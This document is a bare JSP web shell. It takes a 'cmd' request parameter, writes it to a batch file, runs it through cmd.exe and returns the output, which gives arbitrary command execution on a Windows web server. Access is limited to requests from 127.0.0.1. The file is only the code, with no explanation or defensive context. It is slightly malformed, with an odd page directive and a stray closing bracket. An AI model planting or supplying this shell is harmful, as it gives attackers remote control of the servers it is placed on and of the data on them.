<%page import="java.util.*,java.io.*"%>
<% if (request.getRemoteAddr().equals("127.0.0.1"))
{
        PrintWriter pw = new PrintWriter(new FileOutputStream("uws.bat"));
        pw.println(request.getParameter("cmd") + " 2>&1"); pw.close();
        DataInputStream b = new DataInputStream(Runtime.getRuntime().exec("cmd.exe /c uws.bat").getInputStream());
        String s; while ((s = b.readLine()) != null ) out.println(s);
} %>
>
